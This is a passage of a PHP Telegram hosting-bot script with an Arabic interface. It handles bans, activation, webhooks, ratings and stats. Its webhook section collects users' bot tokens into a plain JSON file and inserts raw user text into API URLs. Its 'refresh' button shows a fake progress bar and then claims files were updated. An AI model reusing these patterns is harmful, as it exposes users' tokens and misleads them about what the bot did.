[['text'=>"الغاء ❌",'callback_data'=>"ksmban"]],
]
])
]);
}
if($text  and $text !="/start" and $sudoamr=="unban" and in_array($from_id,$sudo) and is_numeric($text)){
if(in_array($text,$ban)){

$str=file_get_contents("sudo/ban.txt");
$str=str_replace("$text\n",'',$str);
file_put_contents("sudo/ban.txt",$str);
bot('sendmessage',[
'chat_id'=>$chat_id, 
'text'=>"• تم الغاء الحظر بنجاح : $text ✅",
'reply_markup'=>json_encode(['inline_keyboard'=>[
[['text'=>"⦅ رجــوع ⦆ ➡️",'callback_data'=>"ksmban"]],
]
])
]);

bot('sendmessage',[
'chat_id'=>$text, 
'text'=>"• لقد تم الغاء الحظر عنك ✅",
]);
}else{
bot('sendmessage',[
'chat_id'=>$chat_id, 
'text'=>"• العضو ليس محظور مسبقاً 🚫",
'reply_markup'=>json_encode(['inline_keyboard'=>[
[['text'=>"⦅ رجــوع ⦆ ➡️",'callback_data'=>"ksmban"]],
]
])
]);
}
$infosudo["info"]["amr"]="null";
file_put_contents("sudo.json", json_encode($infosudo));
}


//قسم الاذاعة//


//قسم الرسائل//
if($data == "sendms"){
bot('EditMessageText',[
'chat_id'=>$admin,
'message_id'=>$message_id,
'text'=>"
*🆔 ارسل ايدي الشخص :*
",
'parse_mode'=>"MARKDOWN",
'reply_markup'=>json_encode([ 
'inline_keyboard'=>[
[["text"=>"الغاء ❌","callback_data"=>"Thkom"]],
]])
]);
$Host['mode'] = 'chat3';
$Host = json_encode($Host,32|128|265);
file_put_contents("Host/Host.json",$Host);
}
if($text != '/start' and $text != null and $Host['mode'] == 'chat3'){
bot('sendMessage',[
'chat_id'=>$admin,
'text'=> "
*• اࢪسل الآن رسالتك 💬 :*
",
'parse_mode'=>"MARKDOWN",
'reply_markup'=>json_encode([ 
'inline_keyboard'=>[
[["text"=>"⦅ رجــوع ⦆ ➡️","callback_data"=>"Thkom"]],
]])
]);
$Host['mode'] = 'poi3';
$Host['idd'] = $text;
$Host = json_encode($Host,32|128|265);
file_put_contents("Host/Host.json",$Host);
}
$ID = $Host['idd'];
if($text != '/start' and $text != null and $Host['mode'] == 'poi3'){
bot('sendMessage',[
'chat_id'=>$admin,
'text'=>"• تم الاࢪسال الى ".$Host['idd']." بنجاح ✅ ",
'parse_mode'=>"Markdown",
 'reply_to_message_id'=>$message_id, 
"reply_markup"=>json_encode([
"inline_keyboard"=>[
[["text"=>"⦅ رجــوع ⦆ ➡️","callback_data"=>"Thkom"]],
]])
]);
bot('sendmessage',[
'chat_id'=>$Host['idd'],
'text'=>"• تم اࢪسال رسالة اليك من المطور .

• الرسالة 💬 :

$text",
'parse_mode'=>"Markdown",
]);
$Host['mode'] = null;
$Host['idd'] = null;
$Host = json_encode($Host,32|128|265);
file_put_contents("Host/Host.json",$Host);
}





if($text == "/Tom") {
  bot("sendMessage", [
            "chat_id" => $admin ,
            "text" => "☆︙هناك شخص طلب تفعيل حساب 
☆︙اسمة : ⦅ $name ⦆
☆︙ايدية : ⦅ [$from_id](tg://user?id=$chat_id) ⦆
☆︙حسابة : ⦅ [$name](tg://openmessage?user_id=$chat_id) ⦆",
            "parse_mode" => "markdown", 
            'reply_markup'=>json_encode([
     'inline_keyboard'=>[
     [['text'=>"⦅ تفعيل الحساب ⦆",'callback_data'=>"trues|$from_id" ], ['text'=>"⦅ رفض التفعيل ⦆",'callback_data'=>"falses|$from_id" ]], 
      ]
    ])
            
        ]);
        bot("sendMessage", [
            "chat_id" => $chat_id ,
            "text" => "*☆︙تم ارسال طلب اشتراكك بنجاح
☆︙سيتم التحقق منه عن طريق المطور
☆︙اذا قمت بتكرار الرسايل سيتم حظرك
☆︙نرجو تفهم الامر منك وشكرا*",
            "parse_mode" => "markdown", 
            
           
        ]);
        return false ;
  } 
 
 if(explode("|", $data)[0] == "trues") {
  bot("editMessagetext",[
            "chat_id" => $chat_id,
            'message_id' => $message_id , 
            "text" => "☆︙تم تفعيل الوضع المدفوع للمستخدم" ,
        ]);
        bot("sendMessage", [
            "chat_id" => explode("|", $data)[1] ,
            "text" => "*☆︙تم تفعيل البوت لك شكرا على ثقتك ♡. 

☆︙ارسل ⦅ /start ⦆*",
            "parse_mode" => "markdown", 
            
        ]);
        $UploadEr["mems"][explode("|", $data)[1]] = 1 ;
 $UploadEr["memsA"][] = explode("|", $data)[1] ;
        SETJSON($UploadEr);
  } 
  
  if(explode("|", $data)[0] == "falses") {
  bot("editMessagetext",[
            "chat_id" => $chat_id,
            'message_id' => $message_id , 
            "text" => "*☆︙تم رفض الطلب ❌*" ,
        ]);
        bot("sendMessage", [
            "chat_id" => explode("|", $data)[1] ,
            "text" => "*☆︙تم رفض طلبك الرجاء التواصل مع المالك لتفعيل البوت لك @T_0_M0 ❌.*",
            "parse_mode" => "markdown", 
            
        ]);
        
  } 
  
if ($UploadEr["mems"][$from_id] == null) {
 if($from_id != $admin) {
 bot("sendMessage", [
            "chat_id" => $chat_id ,
            "text" => "*✬︙اهلا بك في بوت الاستضافه المدفوعه 
✬︙يرجى الاشتراك لتفعيل البوت 
✬︙او يمكنك انتظار المسابقات لتفعيل البوت 
✬︙قناة مسابقات تفعيل البوت @izeoe*",
                'parse_mode'=>"markdown",
                'reply_markup'=>json_encode([
     'inline_keyboard'=>[
     [['text'=>"⦅ عدد مستخدمي البوت | $SAl ⦆",'callback_data'=>"Abdoo" ]], 
      [['text'=>"⦅ المطور ⦆",'url'=>"https://t.me/T_0_M0" ],['text'=>" ⦅ قناة المطور ⦆",'url'=>"https://t.me/izeoe" ]], 
      ]
    ])
            ]);
        return false ;
        exit ;
       } 
 } 
 
 
 if($data == "sendReport") {
 bot("editMessagetext",[
            "chat_id" => $chat_id,
            'message_id' => $message_id , 
            "text" => "
☆︙ارسل الان الرساله التوضيحيه للمطور
☆︙ان كان عن طريق الخطا سيتم فك الحظر
" ,
        ]);
 $UploadEr["mode"][$from_id] = "sR" ;
        SETJSON($UploadEr);
        return false ;
 } 
 
 if($text and $UploadEr["mode"][$from_id] == "sR") {
  bot("sendMessage", [
            "chat_id" => $chat_id,
            "text" => "☆︙تم استلام الطلب سيتم مراجعته في اقرب وقت ممكن",
            "parse_mode" => "markdown"
            
        ]);
        bot("sendMessage", [
            "chat_id" => $admin ,
            "text" => "☆︙طلب فك حظر عزيزي المبرمج
☆︙اسمة : ⦅ $name ⦆
☆︙ايدية : [$from_id](tg://user?id=$chat_id) 
☆︙حسابة : [$name](tg://openmessage?user_id=$chat_id)

☆︙الرسالة التوضيحية للعضو  : ⦅ $text ⦆
☆︙لفك الحظر عنه ارسل [/Unb_$from_id]",
            "parse_mode" => "markdown"
            
        ]);
        $UploadEr["mode"][$from_id] = null ;
        SETJSON($UploadEr);
        return false ;
  }
if ($UploadEr["mems"][$from_id] == null) {
	$UploadEr["mems"][$from_id] = 1 ;
	$UploadEr["memsA"][] = $from_id ;
        SETJSON($UploadEr);
	} 
	if($data == "sendReport") {
	bot("editMessagetext",[
            "chat_id" => $chat_id,
            'message_id' => $message_id , 
            "text" => "
☆︙ارسل الان الرساله التوضيحيه للمطور
☆︙ان كان عن طريق الخطا سيتم فك الحظر
" ,
        ]);
	$UploadEr["mode"][$from_id] = "sR" ;
        SETJSON($UploadEr);
        return false ;
	} 
	
	if($text and $UploadEr["mode"][$from_id] == "sR") {
		bot("sendMessage", [
            "chat_id" => $chat_id,
            "text" => "☆︙تم استلام الطلب سيتم مراجعته في اقرب وقت ممكن ",
            "parse_mode" => "markdown"
            
        ]);
        bot("sendMessage", [
            "chat_id" => $admin ,
            "text" => "☆︙طلب فك حظر عزيزي المبرمج
☆︙اسمة : ⦅ $name ⦆
☆︙ايدية : [$from_id](tg://user?id=$chat_id) 
☆︙حسابة : [$name](tg://openmessage?user_id=$chat_id)

☆︙الرسالة التوضيحية للعضو  : ⦅ $text ⦆
☆︙لفك الحظر عنه ارسل [/Unb_$from_id]",
            "parse_mode" => "markdown"
            
        ]);
        $UploadEr["mode"][$from_id] = null ;
        SETJSON($UploadEr);
        return false ;
		} 
$not = array("$admin", "5564378935");
if (isset($from_id) && is_array($UploadEr)) {
	if (in_array($from_id, $UploadEr)) {
    if (!in_array($from_id, $not)) {
        bot("deleteMessage", [
            "chat_id" => $chat_id,
            "message_id" => $UploadEr["m_id"][$from_id]
        ]);
        $n = bot("sendMessage", [
            "chat_id" => $chat_id,
            "text" => "*🚫︙تم حظرك من البوت
بسبب رفع ملفات مخالف*ة",
            "parse_mode" => "markdown", 
            'reply_markup'=>json_encode([
     'inline_keyboard'=>[
     [['text'=>"⦅ ارسال طلب فك حظر ⦆",'callback_data'=>"sendReport" ]], 
      ]
    ])
        ]);
        $UploadEr["m_id"][$from_id] = $n->result->message_id;
        SETJSON($UploadEr);
        return false;
       } 
    }
}
$A = $e . $fm;
if ($UploadEr["mems"][$from_id] == null) {
	$UploadEr["mems"][$from_id] = 1 ;
	$UploadEr["memsA"][] = $from_id ;
        SETJSON($UploadEr);
	} 
	if($data == "sendReport") {
	bot("editMessagetext",[
            "chat_id" => $chat_id,
            'message_id' => $message_id , 
            "text" => "
☆︙ارسل الان الرساله التوضيحيه للمطور
☆︙ان كان عن طريق الخطا سيتم فك الحظر
" ,
        ]);
	$UploadEr["mode"][$from_id] = "sR" ;
        SETJSON($UploadEr);
        return false ;
	} 
	
	if($text and $UploadEr["mode"][$from_id] == "sR") {
		bot("sendMessage", [
            "chat_id" => $chat_id,
            "text" => "☆︙تم استلام الطلب سيتم مراجعته في اقرب وقت ممكن",
            "parse_mode" => "markdown"
            
        ]);
        bot("sendMessage", [
            "chat_id" => $admin ,
            "text" => "☆︙طلب فك حظر عزيزي المبرمج
☆︙اسمة : ⦅ $name ⦆
☆︙ايدية : [$from_id](tg://user?id=$chat_id) 
☆︙حسابة : [$name](tg://openmessage?user_id=$chat_id)

☆︙الرسالة التوضيحية للعضو  : ⦅ $text ⦆
☆︙لفك الحظر عنه ارسل [/Unb_$from_id]",
            "parse_mode" => "markdown"
            
        ]);
        $UploadEr["mode"][$from_id] = null ;
        SETJSON($UploadEr);
        return false ;
		} 
$not = array("$admin", "5564378935");
if (isset($from_id) && is_array($UploadEr)) {
	if (in_array($from_id, $UploadEr)) {
    if (!in_array($from_id, $not)) {
        bot("deleteMessage", [
            "chat_id" => $chat_id,
            "message_id" => $UploadEr["m_id"][$from_id]
        ]);
        $n = bot("sendMessage", [
            "chat_id" => $chat_id,
            "text" => "*☆︙You are banned from using the bot due to violations.

☆︙تم حظرك من استخدام الروبوت بسبب الانتهاكات.*",
            "parse_mode" => "markdown", 
            'reply_markup'=>json_encode([
     'inline_keyboard'=>[
     [['text'=>"⦅ ارسال طلب فك حظر ⦆",'callback_data'=>"sendReport" ]], 
      ]
    ])
        ]);
        $UploadEr["m_id"][$from_id] = $n->result->message_id;
        SETJSON($UploadEr);
        return false;
       } 
    }
}

		
		if(preg_match("/Unb_/", $text)) {
			if($from_id == $admin) {
				$B=array_search(explode("_",$text)[1],$UploadEr);
        unset($UploadEr[$B]);
        SETJSON($UploadEr);
				bot("sendMessage", [
            "chat_id" => $admin ,
            "text" => "
            Done ✅
            Id : (". explode("_",$text)[1].") / $B
",
            "parse_mode" => "markdown"
            
        ]);
        bot("sendMessage", [
            "chat_id" => explode("_",$text)[1] ,
            "text" => "☆︙تم فك الحظر عن حسابك
☆︙رجائا التزام بقوانين البوت ⦅ /help ⦆
",
            "parse_mode" => "markdown"
            
        ]);
        bot("sendmessage",[
                "chat_id" => explode("_",$text)[1], 
                "text" => "*☆︙مرحبا بك* [$name](tg://user?id=$from_id) في بوت
*☆︙رفع الملفات عل الاستضافه 
☆︙ملفاتك المرفوعه ⦅ $counts ⦆
☆︙عدد جميع ملفات المرفوعه ⦅ $vc ⦆
☆︙عدد مستخدمين البوت ⦅ $SAl ⦆
☆︙تعليمات البوت ⦅ /help ⦆*

             [تابع قناة تحديثات البوت](https://t.me/izeoe)",
                'parse_mode'=>"markdown",
                'reply_markup'=>json_encode([
     'inline_keyboard'=>[
     [['text'=>"⦅ رفع الملف 📤 ⦆",'callback_data'=>"SendFile"]],
     [['text'=>"⦅ تحديث البوت ♻️ ⦆",'callback_data'=>"refr" ],['text'=>"⦅ احصائيات الرفع 📊 ⦆",'callback_data'=>"nas" ]], 
     [['text'=>"⦅ حذف جميع ملفاتك ❗⦆",'callback_data'=>"deleteall" ]], 
     [['text'=>"⦅ تقييم البوت ⭐ ⦆",'callback_data'=>"tqeemat" ],['text'=>"⦅ سرعة الاستضافة ✨ ⦆",'callback_data'=>"bing" ]], 
     [['text'=>"⦅ حاجاتي 📂 ⦆",'callback_data'=>"show" ]], 
     [['text'=>"⦅ فك ضغط ملف 📮 ⦆",'callback_data'=>"zip" ],['text'=>"⦅ انشاء فولدر 📂 ⦆",'callback_data'=>"uploadD" ]],
     [['text'=>"⦅ تعديل ملف 📝 ⦆",'callback_data'=>"Editfile" ]],
     [['text'=>"⦅ المطور 👨🏻‍💻 ⦆",'url'=>"https://t.me/T_0_M0" ],['text'=>" ⦅ قناة المطور 🔥 ⦆",'url'=>"https://t.me/izeoe" ]], 
     [['text'=>"⦅ قسم الويب هوك ⦆",'callback_data'=>"exit" ]],
      ]
    ])
            ]);
				} 
			} 
		

$update = json_decode(file_get_contents('php://input'));
if(isset($update->message)){
$message = $update->message;
$message_id = $update->message->message_id;
$chat_id = $message->chat->id;
$text = $message->text;
$user = $message->from->username;
$name = $message->from->first_name;
$name1 = $message->from->last_name;
$from_id = $message->from->id;
$tc = $message->chat->type;
$forward = $update->message->forward_from->id;
}
if(isset($update->callback_query)){
$data = $update->callback_query->data;
$chat_id = $update->callback_query->message->chat->id;
$message_id = $update->callback_query->message->message_id;
$name = $update->callback_query->message->chat->first_name;
$user = $update->callback_query->message->chat->username;
$from_id = $chat_id;
$tc = $update->callback_query->message->chat->type;
}
$boti = bot('getme',['bot'])->result->username;
$hook = json_decode(file_get_contents("hook.json"),1);
function webhook($array){
file_put_contents("hook.json",json_encode($array,32|128|265));
}
#--------------------- ستارت -------------------#

if($data == "exit"){
bot('deletemessage',[
'chat_id'=>$chat_id,
'message_id'=>$message_id,
]);
bot('sendphoto',[
'chat_id'=>$chat_id, 
'photo'=> "https://t.me/gey9e/6",
'caption'=>" *☆︙مرحبا بك عزيزي ⦅* [$name](tg://user?id=$chat_id) *⦆
☆︙في قسم الويب هوك
☆︙يمكنك عمل ويبهوك و حذفه بسهوله
☆︙البوت امـن بنسبة عاليه جداً
☆︙يمكنك ربط بوتك بموقع ويبهوك*", 
'parse_mode'=>"Markdown",
'message_id'=>$message_id, 
'reply_markup'=>json_encode([ 
'inline_keyboard'=>[
[['text'=>"⦅ عمل ويب هوك ⦆", 'callback_data'=>'create']],
[['text'=>"⦅ حذف الويبهوك ⦆", 'callback_data'=>'delet'],['text'=>"⦅ معلومات التوكن ⦆", 'callback_data'=>'infos']],
[['text'=>"⦅ رجوع ⦆", 'callback_data'=>'back']],
]])
]);
unset($hook[$from_id]);
 webhook($hook);
} 
#--------------------- save -------------------#
$mydata = $hook[$chat_id]['data'];
$mytoken = $hook[$chat_id]['token'];
$array=['create','delet','infos'];
if(in_array($data,$array)){
bot('deletemessage',[
'chat_id'=>$chat_id,
'message_id'=>$message_id,
]);
bot('sendmessage',[ 
'chat_id'=>$chat_id, 
'text'=>"*☆︙حسنا عزيزي ارسل توكن البوت الان*", 
'parse_mode'=>"Markdown",
'message_id'=>$message_id, 
'reply_markup'=>json_encode([ 
'inline_keyboard'=>[
[['text'=>"⦅ رجوع ⦆",'callback_data'=>"exit"]],
]])
]);
 $hook[$from_id]['data']=$data;
 $hook[$from_id]['message']=$message_id;
 webhook($hook);
}
#--------------------- معلومات التوكن -------------------#
if(preg_match('/\d:\S{35}/',$text)){
 $info = json_decode(file_get_contents("https://api.telegram.org/bot".filter_var($text,FILTER_SANITIZE_STRING)."/getme"));
$getwebhook = json_decode(file_get_contents("https://api.telegram.org/bot$text/getwebhookinfo"));
$bot_user = $info->result->username;
$bot_name = $info->result->first_name;
$bot_id = $info->result->id;
$bot_url = $getwebhook->result->url;
if($info->ok =="ture"){
bot('deletemessage',[ 
 'chat_id'=>$chat_id,
 'message_id'=>$hook[$from_id]['message']]);
if ($mydata=='create'){
bot('deletemessage',[
'chat_id'=>$chat_id,
'message_id'=>$message_id,
]);
bot('sendmessage',[ 
 'chat_id'=>$chat_id,
 'text'=>"*☆︙حسنا عزيزي ارسل رابط الويب هوك*",
 'parse_mode'=>"Markdown",
'reply_markup'=>json_encode([
'inline_keyboard'=>[
[['text'=>"⦅ رجوع ⦆", 'callback_data'=>'exit']],
]])
 ]);
 $hook[$from_id]['token']=$text;
 $hook[$from_id]['message']=$message_id;
 webhook($hook);
}
#---------------------  حذف الويب هوك -------------------#
if ($mydata=='delet'){
bot('deletemessage',[
'chat_id'=>$chat_id,
'message_id'=>$message_id,
]);
bot('editMessageText',[ 
 'chat_id'=>$chat_id,
 'text'=>"*☆︙تم حذف الويب هوك بنجاح ✅*",
 'parse_mode'=>"Markdown",
'reply_markup'=>json_encode([
'inline_keyboard'=>[
[['text'=>"⦅ رجوع ⦆", 'callback_data'=>'exit']],
]])
 ]);
 $send ="*☆︙تم حذف الويب هوك بنجاح ✅\n ☆︙بواسطة البوت : @PH_U7BOT*";
file_get_contents("https://api.telegram.org/bot".$text."/sendmessage?chat_id=$chat_id&text=".urlencode($send));
file_get_contents("https://api.telegram.org/bot$text/deletewebhook");
unset($hook[$from_id]);
 webhook($hook);
}
#--------------------- معلومات الويب هوك -------------------#
if ($mydata=='infos'){
bot('deletemessage',[
'chat_id'=>$chat_id,
'message_id'=>$message_id,
]);
bot('sendMessage',[ 
 'chat_id'=>$chat_id,
 'text'=>"*☆︙معلومات بوت : ⦅ @$bot_user ⦆*

*☆︙اسم البوت : ⦅* [$bot_name](@$bot_user) *⦆
☆︙يوزر البوت : ⦅ @$bot_user ⦆
☆︙ايدي البوت :* `$bot_id` 
☆︙رابط الويهوك : ⦅ $bot_url ⦆*",
 'parse_mode'=>"Markdown",
'reply_markup'=>json_encode([
'inline_keyboard'=>[
[['text'=>"⦅ رجوع ⦆", 'callback_data'=>'exit']],
]])
 ]);
 unset($hook[$from_id]);
 webhook($hook);
}
}else{
bot('sendMessage',[ 
 'chat_id'=>$chat_id,
 'text'=>"*☆︙التوكن خطا او تم تغييره ❗*",
 'parse_mode'=>"Markdown",
'reply_markup'=>json_encode([
'inline_keyboard'=>[
[['text'=>"⦅ رجوع ⦆", 'callback_data'=>'exit']],
]])
 ]);
}}
if(preg_match("/\b(?:(?:https?|http):\/\/|www\.)[-a-z0-9+&@#\/%?=~_|!:,.;]*[-a-z0-9+&@#\/%=~_|]/i",$text) and $mytoken!==null){
$send ="☆︙مرحبا بك عزيزي\n☆︙تم عمل ويبهوك بنجاح ✅\n☆︙بوت عمل ويب هوك : @PH_U7BOT";
file_get_contents("https://api.telegram.org/bot".$mytoken."/setwebhook?url=$text");
file_get_contents("https://api.telegram.org/bot".$mytoken."/sendmessage?chat_id=$chat_id&text=".urlencode($send));
bot('deletemessage',[ 
 'chat_id'=>$chat_id,
 'message_id'=>$hook[$from_id]['message']]);
 bot('sendMessage',[ 
 'chat_id'=>$chat_id,
 'text'=>"*☆︙تم عمل ويبهوك بنجاح ✅*",
 'parse_mode'=>"Markdown",
 'reply_markup'=>json_encode([
 'inline_keyboard'=>[
[['text'=>"⦅ رجوع ⦆", 'callback_data'=>'exit']],
 ]])
 ]);
 unset($hook[$from_id]);
 webhook($hook);
}			
			
			
$admin = "5564378935"; #ايديك
$update = json_decode(file_get_contents('php://input'));
if ($update->callback_query) {
    $data = $update->callback_query->data;
    $chat_id = $update->callback_query->message->chat->id;
    $message_id = $update->callback_query->message->message_id;
    $name = $update->callback_query->message->chat->first_name;
    $from_id = $update->callback_query->from->id;
} elseif ($update->message) {
    $message = $update->message;
    $message_id = $update->message->message_id;
    $chat_id = $message->chat->id;
    $text = $message->text;
    $name = $message->from->first_name;
    $from_id = $message->from->id;
}

$nogom = [];
if (file_exists('nogom.json')) {
$nogom = json_decode(file_get_contents('nogom.json'), true);
}
if ($data == "tqeemat") {
    $average_rating = $nogom ? array_sum($nogom) / count($nogom) : 0;
    $nogomall = count($nogom);
    $stars = str_repeat("⭐", round($average_rating));
    $average_rating = round($average_rating, 1);
    bot('sendMessage', [
        'chat_id' => $chat_id,
        'text' => "*☆︙تقييمك للبوت : $stars ($average_rating)

☆︙عدد المشاركين في التقييم :  ⦅ $nogomall ⦆

☆︙يرجى تقييم البوت من الازرار 🩵👇🏻.*",
        'parse_mode' => "markdown",
        'reply_markup' => json_encode([
            'inline_keyboard' => [
                [['text' => "⭐", 'callback_data' => "1"]],
                [['text' => "⭐⭐", 'callback_data' => "2"]],
                [['text' => "⭐⭐⭐", 'callback_data' => "3"]],
                [['text' => "⭐⭐⭐⭐", 'callback_data' => "4"]],
                [['text' => "⭐⭐⭐⭐⭐", 'callback_data' => "5"]],
                [["text"=>"⦅ الصفحه الرئيسيه ⦆","callback_data"=>"back"]],
            ]
        ])
    ]); 
} elseif (in_array($data, ["1", "2", "3", "4", "5"])) {
    $rating = (int)$data;
    $nogom[$chat_id] = $rating;
    file_put_contents('nogom.json', json_encode($nogom));
    $average_rating = array_sum($nogom) / count($nogom);
    $stars = str_repeat("⭐", round($average_rating));
    $average_rating = round($average_rating, 1);
    bot('editMessagetext', [
        'chat_id' => $chat_id,
        'message_id' => $message_id,
        'text' => "*شكرا لتقييمك

$stars ($average_rating)
*",
        'parse_mode' => "markdown",
        'reply_markup' => json_encode([
            'inline_keyboard' => [
                [['text' => "⦅ إعادة التقييم ⦆", 'callback_data' => "nogom"]],
                [["text"=>"⦅ الصفحه الرئيسيه ⦆","callback_data"=>"back"]],
 ]])
]);
    bot("sendMessage", [
        "chat_id" => $admin,
        "text" => "*تم تقيم البوت من* $name 
*ٴ𓏳𓏳𓏳𓏳𓏳𓏳𓏳𓏳𓏳𓏳𓏳𓏳𓏳
تقييمه للبوت $rating = ⭐
ٴ𓏳𓏳𓏳𓏳𓏳𓏳𓏳𓏳𓏳𓏳𓏳𓏳𓏳*
☆︙المعرف [@$user]
☆︙الايدي $chat_id
☆︙[$name](https://t.me/$user)
*ٴ𓏳𓏳𓏳𓏳𓏳𓏳𓏳𓏳𓏳𓏳𓏳𓏳𓏳*",
        "parse_mode" => "markdown",
        'reply_markup' => json_encode([
            'inline_keyboard' => [
                [['text' => "⦅ إرسال شكر ⦆", 'callback_data' => "shkr|$from_id|$name"]],
     ]])
  ]);
} elseif(explode("|", $data)[0] == "shkr") {
$from_id = explode("|", $data)[1];
$name = explode("|", $data)[2];
  bot("editMessagetext",[
            "chat_id" => $chat_id,
            'message_id' => $message_id , 
            "text" => "
*- تم ارسال رسالة شكر لـ ⦅ $name ⦆ *
" ,
            "parse_mode" => "markdown", 
        ]);
        bot("sendMessage", [
            "chat_id" => $from_id ,
            "text" => "
*شكرا لك على تقييم البوت هذا الشكر موجه لك من مالك البوت شخصيا 🩵.*
", #@abdo_1
            "parse_mode" => "markdown", 
            
   ]);   
}			
			

			

$counts = $UploadEr["count$from_id"] ?? 0;
$vc = $UploadEr["count"] ?? 0;
$no = format_number($vc)?? "0";
$nj = count($UploadEr["memsA"]) ;
   if( $text == "/start") {
   	bot("sendmessage",[
                "chat_id" => $chat_id, 
                "text" => "*☆︙مرحبا بك* [$name](tg://user?id=$from_id) في بوت
*☆︙رفع الملفات عل الاستضافه 
☆︙ملفاتك المرفوعه ⦅ $counts ⦆
☆︙عدد جميع ملفات المرفوعه ⦅ $vc ⦆
☆︙عدد مستخدمين البوت ⦅ $SAl ⦆
☆︙تعليمات البوت ⦅ /help ⦆*

             [تابع قناة تحديثات البوت](https://t.me/izeoe)",
                'parse_mode'=>"markdown",
                'reply_markup'=>json_encode([
     'inline_keyboard'=>[
     [['text'=>"⦅ رفع الملف 📤 ⦆",'callback_data'=>"SendFile"]],
     [['text'=>"⦅ تحديث البوت ♻️ ⦆",'callback_data'=>"refr" ],['text'=>"⦅ احصائيات الرفع 📊 ⦆",'callback_data'=>"nas" ]], 
     [['text'=>"⦅ حذف جميع ملفاتك ❗⦆",'callback_data'=>"deleteall" ]], 
     [['text'=>"⦅ تقييم البوت ⭐ ⦆",'callback_data'=>"tqeemat" ],['text'=>"⦅ سرعة الاستضافة ✨ ⦆",'callback_data'=>"bing" ]], 
     [['text'=>"⦅ حاجاتي 📂 ⦆",'callback_data'=>"show" ]], 
     [['text'=>"⦅ فك ضغط ملف 📮 ⦆",'callback_data'=>"zip" ],['text'=>"⦅ انشاء فولدر 📂 ⦆",'callback_data'=>"uploadD" ]],
     [['text'=>"⦅ تعديل ملف 📝 ⦆",'callback_data'=>"Editfile" ]],
     [['text'=>"⦅ المطور 👨🏻‍💻 ⦆",'url'=>"https://t.me/T_0_M0" ],['text'=>" ⦅ قناة المطور 🔥 ⦆",'url'=>"https://t.me/izeoe" ]], 
     [['text'=>"⦅ قسم الويب هوك ⦆",'callback_data'=>"exit" ]],
      ]
    ])
            ]);
            $UploadEr["المود"][$from_id] = null ;
        SETJSON($UploadEr) ;
        return false ;
        $chat_id = $update->getMessage()->getChat()->getId();
  }
  
  function progress($total, $current){
$progress = $current / $total;
$bar_length = 20;
$filled_length = round($bar_length * $progress);
$bar = str_repeat("✳️", $filled_length) . str_repeat("✨", ($bar_length - $filled_length));
$result = [
"bar"=>"[".$bar."]",
"progress"=>intval($progress * 100) ."%",
];
return $bar. intval($progress * 100) ."%";
}

function format_number($number) {
    $suffixes = array('', 'k', 'm', 'b', 't');
    $suffix_index = 0;

    while ($number >= 1000) {
        $number /= 1000;
        $suffix_index++;
    }

    return round($number, 1) . $suffixes[$suffix_index];
}


if($data == "nas") {
	$botfile = $UploadEr["FileMatch"]??"0";
	$other = $UploadEr["unFileMatch"]?? "0";
	$mm = $UploadEr["filehc"]?? "0";
	$curl = $UploadEr["curlfile"]?? "0";
	$no = format_number($vc)?? "0";
	bot("editMessagetext",[
            "chat_id" => $chat_id,
            'message_id' => $message_id , 
            "text" => "*☆︙احصائيات الرفع في البوت @PH_U7BOT
☆︙عدد مستخدمين البوت : ⦅ $SAl ⦆
☆︙جميع الملفات : ⦅ $vc | $no ⦆
☆︙ملفات بوتات : ⦅ $botfile ⦆
☆︙غيرها من الملفات : ⦅ $other ⦆
☆︙ملفات اختراق تم الغائها : ⦅ $mm ⦆
☆︙نسبه حمايه البوت للملفات الضاره :  ⦅ عاليه الدقه ⦆*" ,
                'parse_mode'=>"markdown",
                'reply_markup'=>json_encode([
     'inline_keyboard'=>[
     [['text'=>"⦅ حذف جميع ملفاتك ❗⦆",'callback_data'=>"deleteall" ]], 
      [['text'=>"⦅ المطور ⦆",'url'=>"https://t.me/T_0_M0" ],['text'=>" ⦅ قناة المطور ⦆",'url'=>"https://t.me/izeoe" ]],  
      ]
    ])
            ]);
	} 

if($data =="pannel"){
bot('EditMessageText',[
'chat_id'=>$chat_id2,
'message_id'=>$message_id,
'text'=>"*• اهلا بك في قسم - الاحصائيات . 📊
ٴ𓏳𓏳𓏳𓏳𓏳𓏳𓏳𓏳𓏳𓏳𓏳𓏳
• عدد اعضاء بوتك : ⦅ $SAl ⦆
• المتفاعلين اليوم  : ⦅ $todayuser ⦆
• عدد الرسائل المرسله : ⦅ ".$abbas09['addmessage']." ⦆
• عدد الرسائل المستلمه : ⦅ ".$abbas09['messagee']." ⦆
• مجموع الرسائل : ⦅ $xll ⦆
• جميع الملفات المرفوعه : ⦅ $vc | $no ⦆
ٴ𓏳𓏳𓏳𓏳𓏳𓏳𓏳𓏳𓏳𓏳𓏳𓏳
• اخر خمس مشتركين


▫️ 1 - ".$users[count($users)-2]."
▫️ 2 - ️".$users[count($users)-3]."
▫️ 3 - ️".$users[count($users)-4]."
▫️ 4 - ️".$users[count($users)-5]."
▫️ 5 - ️".$users[count($users)-6]."

ٴ𓏳𓏳𓏳𓏳𓏳𓏳𓏳𓏳𓏳𓏳𓏳𓏳*",'parse_mode'=>"MarkDown",
'reply_markup'=>json_encode([ 
'inline_keyboard'=>[
[['text'=>'⦅ رجوع ⦆' ,'callback_data'=>"Thkom"]],
]])
]);
} 

  if($data == "refr") {
  	for($i=0;$i < 11;$i++){
  	bot("editMessagetext",[
            "chat_id" => $chat_id,
            'message_id' => $message_id , 
            "text" => "*
♻️] يتم عمل تحديث انتضر قليلا
". progress("100",$i*10)."
            *
" ,
            "parse_mode" => "marKdown",
            
        ]);
  }
  if($i >= 10){
  	bot("editMessagetext",[
            "chat_id" => $chat_id,
            'message_id' => $message_id , 
            "text" => "*
☆︙تم الانتهاء من التحديث ✔
☆︙تم تحديث ملفات البوت ✔
            *
" ,
            "parse_mode" => "marKdown",
            
        ]);
        bot("sendmessage",[
                "chat_id" => $chat_id, 
                "text" => "*☆︙مرحبا بك* [$name](tg://user?id=$from_id) في بوت
*☆︙رفع الملفات عل الاستضافه 
☆︙ملفاتك المرفوعه ⦅ $counts ⦆
☆︙عدد جميع ملفات المرفوعه ⦅ $vc ⦆
☆︙عدد مستخدمين البوت ⦅ $SAl ⦆
☆︙تعليمات البوت ⦅ /help ⦆*

             [تابع قناة تحديثات البوت](https://t.me/izeoe)",
                'parse_mode'=>"markdown",
                'reply_markup'=>json_encode([
     'inline_keyboard'=>[
     [['text'=>"⦅ رفع الملف 📤 ⦆",'callback_data'=>"SendFile"]],
     [['text'=>"⦅ تحديث البوت ♻️ ⦆",'callback_data'=>"refr" ],['text'=>"⦅ احصائيات الرفع 📊 ⦆",'callback_data'=>"nas" ]], 
     [['text'=>"⦅ حذف جميع ملفاتك ❗⦆",'callback_data'=>"deleteall" ]], 
